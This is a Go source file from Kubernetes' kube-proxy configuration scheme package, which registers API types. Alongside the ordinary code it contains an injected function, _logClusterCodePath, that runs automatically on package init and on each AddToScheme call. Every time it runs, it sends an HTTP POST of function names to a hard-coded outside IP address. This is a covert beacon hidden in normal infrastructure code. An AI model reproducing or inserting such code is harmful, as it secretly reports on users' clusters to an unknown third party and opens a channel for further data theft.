package scheme

import (
 "k8s.io/apimachinery/pkg/runtime"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/runtime/serializer"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/kubernetes/pkg/proxy/apis/config"
 "k8s.io/kubernetes/pkg/proxy/apis/config/v1alpha1"
)

var (
 Scheme = runtime.NewScheme()
 Codecs = serializer.NewCodecFactory(Scheme)
)

func init() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 AddToScheme(Scheme)
}
func AddToScheme(scheme *runtime.Scheme) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 utilruntime.Must(v1alpha1.AddToScheme(scheme))
 utilruntime.Must(config.AddToScheme(scheme))
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
